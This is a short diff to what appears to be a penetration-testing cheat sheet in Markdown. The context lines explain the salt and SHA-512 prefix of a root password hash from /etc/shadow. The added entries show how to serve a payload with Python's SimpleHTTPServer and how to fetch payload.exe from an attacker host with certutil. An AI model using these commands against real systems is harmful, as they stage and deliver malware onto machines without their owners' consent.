@@ -41,3 +41,15 @@ root:$6$eoOI5IAu$S1eBFuRRxwD7qEcUIjHxV7Rkj9OXaIGbIOiHsjPZF2uGmGBjRQ3rrQY3/6M.fWH
 
 - In this example, `eo0I5IAu` is the unique salt.
 - `$6$` prefix indicates the hashing algorithm, in this case SHA-512.
+
+8) How to host a Python `http` server to host a payload ?
+
+```
+python -m SimpleHTTPServer 80
+```
+
+9) How to download a file from a remote server using CMD on Windows ?
+
+```
+certutil -urlcache -f http://<lhost>/payload.exe payload.exe
+```
